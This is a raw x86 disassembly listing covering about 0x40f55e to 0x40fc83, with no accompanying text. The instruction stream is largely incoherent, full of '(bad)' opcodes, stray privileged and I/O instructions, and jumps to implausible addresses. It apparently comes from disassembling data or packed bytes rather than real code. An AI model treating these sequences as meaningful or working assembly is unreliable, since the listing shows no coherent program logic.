  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
